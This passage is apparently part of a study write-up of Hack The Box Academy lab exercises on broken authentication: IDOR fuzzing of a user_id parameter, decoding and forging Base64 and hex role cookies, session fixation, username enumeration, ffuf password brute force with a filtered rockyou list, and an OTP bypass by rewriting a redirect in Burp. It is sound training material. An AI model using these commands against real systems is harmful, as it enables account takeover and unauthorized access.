+<p><strong>Step 2: Remove the parameter</strong></p>
+<p>Request the same endpoint without <code>user_id</code>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>GET /admin.php HTTP/1.1
+</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Host: target.htb
+</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>Cookie: PHPSESSID=&lt;SESSION_ID&gt;
+</span></code></pre></div>
+<p>In the HTB example, the application redirects to the login page even though the session cookie remains valid.</p>
+<p>This suggests that the application <strong>may be incorrectly using <code>user_id</code> as part of its authentication logic</strong>.</p>
+<p><strong>Step 3: Test direct access</strong></p>
+<p>Request the original URL again:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>GET /admin.php?user_id=183 HTTP/1.1
+</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>Host: target.htb
+</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>Cookie: PHPSESSID=&lt;SESSION_ID&gt;
+</span></code></pre></div>
+<p>The example application returns <code>200 OK</code>, indicating that the parameter affects access to the page.</p>
+<p>However, a <code>200 OK</code> response alone does not prove authentication bypass. <strong>Confirm whether protected information or privileged functionality is actually accessible</strong>.</p>
+<p><strong>Step 4: Test authorization enforcement</strong></p>
+<p>In an authorized lab, investigate whether changing the parameter to another user ID changes the privileges granted.</p>
+<p>For example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>/admin.php?user_id=183
+</span><span id="__span-45-2"><a id="__codelineno-45-2" name="__codelineno-45-2" href="#__codelineno-45-2"></a>/admin.php?user_id=&lt;OTHER_USER_ID&gt;
+</span></code></pre></div>
+<p>If changing the ID allows access to another user's data or administrative functions without proper authorization, the application may have an IDOR or broken access control vulnerability.</p>
+<p>If the application grants administrator privileges solely because a client supplies an administrator's ID, this is a serious authorization flaw.</p>
+<p><strong>Why This Happens</strong></p>
+<p>The underlying problem is <strong>trusting client-controlled input to establish identity or permissions</strong>.</p>
+<p>For example, an insecure implementation might use:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>$user_id = $_GET['user_id'];
+</span></code></pre></div>
+<p>and then use <code>$user_id</code> to determine access without verifying that the authenticated session belongs to that user or has the required privileges.</p>
+<p>The parameter itself is not inherently vulnerable. <strong>The vulnerability exists when the server uses it without appropriate authentication and authorization checks</strong>.</p>
+<h3 id="question_3">📌 Question</h3>
+<p><strong>Step 1: Log in</strong></p>
+<p>Use the supplied credentials:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>Username: htb-stdnt
+</span><span id="__span-47-2"><a id="__codelineno-47-2" name="__codelineno-47-2" href="#__codelineno-47-2"></a>Password: AcademyStudent!
+</span></code></pre></div>
+<p>After logging in, note the redirect URL and inspect the page. Pay particular attention to parameters such as <code>user_id</code>.</p>
+<p><strong>Step 2: Find the administrator's user ID</strong></p>
+<p>The example in HTB's walkthrough redirects to:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>/admin.php?user_id=183
+</span></code></pre></div>
+<p>Your goal is to discover which <strong><code>user_id</code></strong> grants access to the administrator's data.</p>
+<p><strong>Generate a wordlist of numeric IDs:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>seq 1 1000 &gt; user_ids.txt
+</span></code></pre></div>
+<p>Then, using the authenticated session cookie from your own lab session, <strong>run FFUF</strong>:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>ffuf -w user_ids.txt \
+</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>-u "http://&lt;ip&gt;:&lt;PORT&gt;/admin.php?user_id=FUZZ" \
+</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>-b "PHPSESSID=&lt;YOUR_SESSION_ID&gt;" \
+</span><span id="__span-50-4"><a id="__codelineno-50-4" name="__codelineno-50-4" href="#__codelineno-50-4"></a>-fr "Could not load admin data"
+</span></code></pre></div>
+<p><img alt="Result Q in Section11" src="Result Q in Section11.png" /></p>
+<p><img alt="Result2 Q in Section11" src="Result2 Q in Section11.png" /></p>
+<h2 id="section-12">Section 12</h2>
+<h3 id="overview_3">Overview</h3>
+<p>A <strong>session token</strong> is a unique identifier used by a web application to associate requests with a user's authenticated session.</p>
+<p>If an attacker obtains or forges a valid session token, <strong>they may be able to impersonate another user without knowing their password</strong>.</p>
+<p><strong>Common session token vulnerabilities include:</strong></p>
+<ul>
+<li><strong>Brute-forceable tokens</strong>: Tokens are too short or have insufficient entropy.</li>
+<li><strong>Predictable tokens: Tokens</strong>: follow a pattern, such as sequential numbers.</li>
+<li><strong>Partially random tokens</strong>: Most of the token is static, leaving only a small portion unpredictable.</li>
+<li><strong>Encoded tokens</strong>: Tokens contain Base64, hexadecimal, or URL-encoded data that can be modified without integrity protection.</li>
+<li><strong>Weakly protected encrypted tokens</strong>: Poor cryptographic design or implementation allows tokens to be forged or manipulated.</li>
+</ul>
+<h3 id="brute-force-attacks">Brute-Force Attacks</h3>
+<h4 id="short-session-tokens">Short session tokens</h4>
+<p>Consider a web application that issues a four-character hexadecimal session token:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>Set-Cookie: session=a5fd
+</span></code></pre></div>
+<p>A four-character hexadecimal token has only: 16<sup>4</sup> = 65,536 possible combinations.</p>
+<p>This is a small search space, <strong>making brute-force attacks potentially practical if the application lacks effective protections</strong>.</p>
+<h4 id="partially-random-tokens">Partially random tokens</h4>
+<p>A token may appear long but <strong>contain mostly static characters</strong>.</p>
+<p><strong>Example tokens:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>2c0c58b27c71a2ec5bf2b4b6e892b9f9
+</span><span id="__span-52-2"><a id="__codelineno-52-2" name="__codelineno-52-2" href="#__codelineno-52-2"></a>2c0c58b27c71a2ec5bf2b4546092b9f9
+</span><span id="__span-52-3"><a id="__codelineno-52-3" name="__codelineno-52-3" href="#__codelineno-52-3"></a>2c0c58b27c71a2ec5bf2b497f592b9f9
+</span><span id="__span-52-4"><a id="__codelineno-52-4" name="__codelineno-52-4" href="#__codelineno-52-4"></a>2c0c58b27c71a2ec5bf2b48bcf92b9f9
+</span></code></pre></div>
+<p>The tokens share a <strong>common prefix and suffix 28 characters are the same for all five captured sessions</strong>. In this example, <strong>only four hexadecimal characters vary</strong>.</p>
+<p>The session tokens consist of the static string <code>2c0c58b27c71a2ec5bf2b4</code> followed by <code>four random characters</code> and the static string <code>92b9f9</code></p>
+<p>The effective search space for that varying portion is: : 16<sup>4</sup> = 65,536 possible combinations.</p>
+<p><strong>Testing approach:</strong></p>
+<ol>
+<li>Log in repeatedly to your authorized test account.</li>
+<li>Capture the session tokens.</li>
+<li>Compare their <strong>prefixes, suffixes, and changing portions</strong>.</li>
+<li>Determine whether the changing portion <strong>appears random or follows a pattern</strong>.</li>
+<li>Evaluate the <strong>effective entropy</strong> rather than relying on token length alone.</li>
+</ol>
+<h4 id="sequential-session-tokens">Sequential session tokens</h4>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>141233
+</span><span id="__span-53-2"><a id="__codelineno-53-2" name="__codelineno-53-2" href="#__codelineno-53-2"></a>141234
+</span><span id="__span-53-3"><a id="__codelineno-53-3" name="__codelineno-53-3" href="#__codelineno-53-3"></a>141237
+</span><span id="__span-53-4"><a id="__codelineno-53-4" name="__codelineno-53-4" href="#__codelineno-53-4"></a>141238
+</span><span id="__span-53-5"><a id="__codelineno-53-5" name="__codelineno-53-5" href="#__codelineno-53-5"></a>141240
+</span></code></pre></div>
+<p>These values may indicate that the application generates predictable session identifiers.</p>
+<p>If tokens are sequential or otherwise predictable, an attacker might infer valid session identifiers.</p>
+<h3 id="attacking-predictable-session-tokens">Attacking Predictable Session Tokens</h3>
+<p>Some tokens <strong>contain encoded information about the user or their role</strong>.</p>
+<h4 id="base64-encoded-tokens">Base64-encoded tokens</h4>
+<p>Example cookie:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy
+</span></code></pre></div>
+<p>Decode it:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>echo -n 'dXNlcj1odGItc3RkbnQ7cm9sZT11c2Vy' | base64 -d
+</span></code></pre></div>
+<p>Output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>user=htb-stdnt;role=user
+</span></code></pre></div>
+<p>This reveals that the token contains a username and role.</p>
+<p>Base64 is an encoding scheme, not encryption. Anyone who obtains the token can decode its contents.</p>
+<p><strong>Modifying the token</strong></p>
+<p>Suppose the application trusts the role embedded in the cookie and does not verify its integrity.</p>
+<p>The original data is:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>user=htb-stdnt;role=user
+</span></code></pre></div>
+<p>A modified version would be:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>user=htb-stdnt;role=admin
+</span></code></pre></div>
+<p>Encode the modified value:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>echo -n 'user=htb-stdnt;role=admin' | base64
+</span></code></pre></div>
+<p>Example output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>dXNlcj1odGItc3RkbnQ7cm9sZT1hZG1pbg==
+</span></code></pre></div>
+<p>In an authorized lab, this illustrates how an application that <strong>trusts unsigned client-side role data may allow privilege escalation</strong>.</p>
+<h4 id="hexadecimal-encoded-tokens">Hexadecimal-Encoded Tokens</h4>
+<p>Another format uses hexadecimal encoding.</p>
+<p>Example:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>757365723d6874622d7374646e743b726f6c653d75736572
+</span></code></pre></div>
+<p>Decode it with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
+</span></code></pre></div>
+<p>Output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>user=htb-stdnt;role=user
+</span></code></pre></div>
+<p>To encode modified data:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>echo -n 'user=htb-stdnt;role=admin' | xxd -p
+</span></code></pre></div>
+<p>The result represents the same data in hexadecimal.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>757365723d6874622d7374646e743b726f6c653d61646d696e
+</span></code></pre></div>
+<h3 id="question-1_2">📌 Question 1</h3>
+<p><img alt="Result Q1 in Section12" src="Result Q1 in Section12.png" /></p>
+<h3 id="question-2_2">📌 Question 2</h3>
+<p><strong>Step 1: Log in</strong></p>
+<p>Use the supplied credentials:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>Username: htb-stdnt
+</span><span id="__span-66-2"><a id="__codelineno-66-2" name="__codelineno-66-2" href="#__codelineno-66-2"></a>Password: AcademyStudent!
+</span></code></pre></div>
+<p>After logging in, <strong>capture cookie header from Network tab</strong></p>
+<p><strong>Step 2: Identify the encoding type and decode it</strong></p>
+<p><strong>Cookie : <code>session=757365723d6874622d7374646e743b726f6c653d75736572</code></strong>
+<strong>Type : Hexadecimal-Encoded Tokens</strong></p>
+<p>Decode it with:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>echo -n '757365723d6874622d7374646e743b726f6c653d75736572' | xxd -r -p
+</span></code></pre></div>
+<p>Output:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>user=htb-stdnt;role=user
+</span></code></pre></div>
+<p>To encode modified data:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>echo -n 'user=htb-stdnt;role=admin' | xxd -p
+</span></code></pre></div>
+<p>The result represents the same data in hexadecimal.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>757365723d6874622d7374646e743b726f6c653d61646d696e
+</span></code></pre></div>
+<p><strong>Step 3: Change cookie in browser and refresh the page</strong></p>
+<p><img alt="Result Q2 in Section12" src="Result Q2 in Section12.png" /></p>
+<h2 id="section-13">Section 13</h2>
+<h3 id="overview_4">Overview</h3>
+<p><strong>Session management vulnerabilities</strong> can allow attackers to <strong>hijack authenticated sessions or continue using sessions longer than intended</strong>.</p>
+<p>This section covers two common vulnerabilities:</p>
+<ol>
+<li><strong>Session Fixation</strong> — an attacker causes a victim to authenticate using a session ID already known to the attacker.</li>
+<li><strong>Improper Session Timeout</strong> — a session remains valid longer than the application's security requirements allow.</li>
+</ol>
+<h3 id="session-fixation">Session Fixation</h3>
+<p><strong>Session fixation</strong> occurs when a web application does not generate a new session ID after successful authentication.</p>
+<p>If an attacker can make a victim use a session ID known to the attacker, the attacker may be able to reuse that ID to access the victim's authenticated session.</p>
+<p><strong>Step 1: Obtain a session ID</strong></p>
+<p>The attacker obtains a session ID, for example <code>a1b2c3d4e5f6</code>.</p>
+<p><strong>Step 2: Make the victim use that ID</strong></p>
+<p>The vulnerable application accepts a session ID from a URL parameter such as <code>sid</code> and sets it as a cookie.</p>
+<p><strong>Step 3: The victim logs in</strong></p>
+<p>The application authenticates the victim but fails to replace the existing session ID.</p>
+<p><strong>Step 4: Session hijacking</strong></p>
+<p>The attacker attempts to reuse the known session ID to access the victim's authenticated session.</p>
+<p><strong>Example</strong></p>
+<p>A vulnerable application accepts this URL:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>http://vulnerable.htb/?sid=a1b2c3d4e5f6
+</span></code></pre></div>
+<p>It then sets the session cookie using the supplied value:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>HTTP/1.1 200 OK
+</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>Set-Cookie: session=a1b2c3d4e5f6
+</span></code></pre></div>
+<p>If the application <strong>continues using this session ID after the victim logs in</strong>, the attacker may be able to hijack the authenticated session.</p>
+<p><strong>Root cause:</strong> The application allows a session identifier to be controlled externally and <strong>fails to rotate it after authentication</strong>.</p>
+<p><strong>How to test for session fixation</strong></p>
+<ul>
+<li>Inspect how session IDs are created and assigned.</li>
+<li>Check whether URL parameters or other client-controlled inputs can set the session ID.</li>
+<li>Record the session ID before authentication.</li>
+<li>Log in using an authorized test account and record the session ID afterward.</li>
+<li>Verify that successful authentication generates a new session ID.</li>
+<li>Confirm that the old session ID cannot access the authenticated session.</li>
+</ul>
+<h3 id="improper-session-timeout">Improper Session Timeout</h3>
+<p>A <strong>session timeout</strong> defines how long an authenticated session remains valid before the application requires the user to authenticate again.</p>
+<p>Without appropriate expiration, a stolen session token may remain usable for an extended period, increasing the impact of session hijacking.</p>
+<p><strong>Types of session timeout</strong></p>
+<table>
+<thead>
+<tr>
+<th>Timeout type</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Idle timeout</td>
+<td>Expires a session after a period of inactivity.</td>
+</tr>
+<tr>
+<td>Absolute timeout</td>
+<td>Expires a session after a maximum lifetime, even if the user remains active.</td>
+</tr>
+</tbody>
+</table>
+<p><strong>How to test for improper timeout</strong></p>
+<ol>
+<li>Log in to an authorized test account.</li>
+<li>Capture the session cookie.</li>
+<li>Leave the session inactive for the application's expected timeout period.</li>
+<li>Attempt to access a protected endpoint using the existing session.</li>
+<li>Check whether the server rejects the expired session and requires reauthentication.</li>
+<li>If applicable, test whether continued activity prevents expiration beyond the intended absolute lifetime.</li>
+</ol>
+<h2 id="section-14">Section 14</h2>
+<center><b>Password Policy, Username Enumeration, Password Brute-Force & Direct Access Bypass</b></center>
+
+<p><strong>Step 1: Create a New Account and Identify the Password Policy</strong></p>
+<p>First, register a new account to understand the application's registration process and password requirements.</p>
+<p><strong>For example, try:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>Username: bavly
+</span><span id="__span-73-2"><a id="__codelineno-73-2" name="__codelineno-73-2" href="#__codelineno-73-2"></a>Password: 123456
+</span></code></pre></div>
+<p><strong>The application returns the following error:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-74-1"><a id="__codelineno-74-1" name="__codelineno-74-1" href="#__codelineno-74-1"></a>Password does not meet our password policy:
+</span><span id="__span-74-2"><a id="__codelineno-74-2" name="__codelineno-74-2" href="#__codelineno-74-2"></a>
+</span><span id="__span-74-3"><a id="__codelineno-74-3" name="__codelineno-74-3" href="#__codelineno-74-3"></a>- Contains at least one digit
+</span><span id="__span-74-4"><a id="__codelineno-74-4" name="__codelineno-74-4" href="#__codelineno-74-4"></a>- Contains at least one lower-case character
+</span><span id="__span-74-5"><a id="__codelineno-74-5" name="__codelineno-74-5" href="#__codelineno-74-5"></a>- Contains at least one upper-case character
+</span><span id="__span-74-6"><a id="__codelineno-74-6" name="__codelineno-74-6" href="#__codelineno-74-6"></a>- Contains NO special characters
+</span><span id="__span-74-7"><a id="__codelineno-74-7" name="__codelineno-74-7" href="#__codelineno-74-7"></a>- Is exactly 12 characters long
+</span></code></pre></div>
+<p><strong>From this response, we can identify the password policy</strong>
+<img alt="image1 Section14" src="image1 Section14.png" /></p>
+<p><strong>Step 2: Create an Account and Generate a Custom Password Wordlist</strong></p>
+<p>Create the account using a password that meets the requirements.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-75-1"><a id="__codelineno-75-1" name="__codelineno-75-1" href="#__codelineno-75-1"></a>Username: bavly
+</span><span id="__span-75-2"><a id="__codelineno-75-2" name="__codelineno-75-2" href="#__codelineno-75-2"></a>Password: HackerBav0ne
+</span></code></pre></div>
+<p>Next, filter <strong><code>rockyou.txt</code></strong> to generate a wordlist containing passwords that match the application's policy.</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-76-1"><a id="__codelineno-76-1" name="__codelineno-76-1" href="#__codelineno-76-1"></a>awk<span class="w"> </span><span class="s1">'length($0) == 12 &amp;&amp; /[a-z]/ &amp;&amp; /[A-Z]/ &amp;&amp; /[0-9]/ &amp;&amp; /^[[:alnum:]]+$/'</span><span class="w"> </span><span class="se">\</span>
+</span><span id="__span-76-2"><a id="__codelineno-76-2" name="__codelineno-76-2" href="#__codelineno-76-2"></a>/opt/useful/seclists/Passwords/Leaked-Databases/rockyou.txt<span class="w"> </span><span class="se">\</span>
+</span><span id="__span-76-3"><a id="__codelineno-76-3" name="__codelineno-76-3" href="#__codelineno-76-3"></a>&gt;<span class="w"> </span>custom_wordlist.txt
+</span></code></pre></div>
+<p><strong>Step 3: Perform Username Enumeration</strong></p>
+<p>Before attempting a password brute-force attack, <strong>determine whether the application responds differently to valid and invalid usernames.</strong></p>
+<p><strong>Test the following credentials.</strong></p>
+<p><strong>Test 1 — Potentially valid username:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-77-1"><a id="__codelineno-77-1" name="__codelineno-77-1" href="#__codelineno-77-1"></a>Username: bavly
+</span><span id="__span-77-2"><a id="__codelineno-77-2" name="__codelineno-77-2" href="#__codelineno-77-2"></a>Password: 123456
+</span></code></pre></div>
+<p>Response:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-78-1"><a id="__codelineno-78-1" name="__codelineno-78-1" href="#__codelineno-78-1"></a>Invalid credentials.
+</span></code></pre></div>
+<p><strong>Test 2 — Potentially invalid username:</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-79-1"><a id="__codelineno-79-1" name="__codelineno-79-1" href="#__codelineno-79-1"></a>Username: hacker
+</span><span id="__span-79-2"><a id="__codelineno-79-2" name="__codelineno-79-2" href="#__codelineno-79-2"></a>Password: 123456
+</span></code></pre></div>
+<p>Response:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-80-1"><a id="__codelineno-80-1" name="__codelineno-80-1" href="#__codelineno-80-1"></a>Unknown username or password.
+</span></code></pre></div>
+<p>The <strong>different error messages may indicate that the application handles existing and nonexistent usernames differently</strong>. Confirm this behavior with repeated controlled tests before relying on it.</p>
+<p><strong>Automate username enumeration with FFUF</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-81-1"><a id="__codelineno-81-1" name="__codelineno-81-1" href="#__codelineno-81-1"></a>ffuf -w /opt/useful/seclists/Usernames/xato-net-10-million-usernames.txt \
+</span><span id="__span-81-2"><a id="__codelineno-81-2" name="__codelineno-81-2" href="#__codelineno-81-2"></a>-u http://&lt;IP&gt;:&lt;PORT&gt;/login.php \
+</span><span id="__span-81-3"><a id="__codelineno-81-3" name="__codelineno-81-3" href="#__codelineno-81-3"></a>-X POST \
+</span><span id="__span-81-4"><a id="__codelineno-81-4" name="__codelineno-81-4" href="#__codelineno-81-4"></a>-H "Content-Type: application/x-www-form-urlencoded" \
+</span><span id="__span-81-5"><a id="__codelineno-81-5" name="__codelineno-81-5" href="#__codelineno-81-5"></a>-d "username=FUZZ&amp;password=invalid" \
+</span><span id="__span-81-6"><a id="__codelineno-81-6" name="__codelineno-81-6" href="#__codelineno-81-6"></a>-fr "Unknown username or password."
+</span></code></pre></div>
+<p><strong>Result for Username Enumeration: <code>gladys</code></strong></p>
+<p><strong>Step 4: Brute-Force the Password for a Valid Username</strong></p>
+<p>Once you have identified a valid username <strong><code>gladys</code></strong>, use the custom password wordlist generated in Step 2 to test password candidates.</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-82-1"><a id="__codelineno-82-1" name="__codelineno-82-1" href="#__codelineno-82-1"></a>ffuf -w ./custom_wordlist.txt \
+</span><span id="__span-82-2"><a id="__codelineno-82-2" name="__codelineno-82-2" href="#__codelineno-82-2"></a>-u http://&lt;IP&gt;:&lt;PORT&gt;/login.php \
+</span><span id="__span-82-3"><a id="__codelineno-82-3" name="__codelineno-82-3" href="#__codelineno-82-3"></a>-X POST \
+</span><span id="__span-82-4"><a id="__codelineno-82-4" name="__codelineno-82-4" href="#__codelineno-82-4"></a>-H "Content-Type: application/x-www-form-urlencoded" \
+</span><span id="__span-82-5"><a id="__codelineno-82-5" name="__codelineno-82-5" href="#__codelineno-82-5"></a>-d "username=gladys&amp;password=FUZZ" \
+</span><span id="__span-82-6"><a id="__codelineno-82-6" name="__codelineno-82-6" href="#__codelineno-82-6"></a>-fr "Invalid credentials."
+</span></code></pre></div>
+<p><strong>Result: <code>gladys</code>:<code>dWinaldasD13</code></strong></p>
+<p><strong>Step 5: Bypassing OTP Authentication</strong></p>
+<p>After submitting the login credentials <strong><code>gladys</code>:<code>dWinaldasD13</code></strong>, we notice that the application requires an OTP (One-Time Password) to complete the authentication process. We will test two possible approaches to bypass this step.</p>
+<p><strong>Method 1: OTP Brute-Force (Section 6)</strong></p>
+<ol>
+<li>Follow the OTP brute-force technique covered in Section 6.</li>
+<li>Attempt to identify the correct OTP using the available testing method.</li>
+<li><strong>Result:</strong> The attempt was unsuccessful, and we could not discover the correct OTP.</li>
+</ol>
+<p><strong>Method 2: Direct Access Bypass (Section 10)</strong></p>
+<ol>
+<li>Open Burp Suite and enable Proxy interception.</li>
+<li>Request the protected endpoint <code>/profile.php</code> after submitting the login credentials.</li>
+<li>Inspect the server response and check whether it contains protected page content alongside a <code>302 Found</code> redirect.</li>
+<li>If necessary, enable <strong>Do intercept → Response to this request</strong> to inspect the response before forwarding it.</li>
+<li>In the authorized lab, change the response status from <code>302 Found</code> to <code>200 OK</code>, then forward the response to observe how the browser handles the returned content.</li>
+</ol>
+<p><strong>Result:</strong> The second method worked. We were able to access and display the profile page directly without successfully completing the OTP verification.</p>
+<p><img alt="image2 Section14" src="image2 Section14.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../../../..", "features": ["navigation.instant", "navigation.instant.prefetch", "navigation.tracking", "navigation.sections", "navigation.top", "search.suggest", "search.highlight", "content.code.copy"], "search": "../../../../assets/javascripts/workers/search.a7633da7.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../../../assets/javascripts/bundle.c21346df.min.js"></script>
+      
+        <script src="../../../../javascripts/sidebar-profile.js"></script>
+      
+        <script src="../../../../javascripts/notes-data.js"></script>
+      
+        <script src="../../../../javascripts/site.js"></script>
+      
+        <script src="../../../../javascripts/toc.js"></script>
+      
+    
+  </body>
+</html>
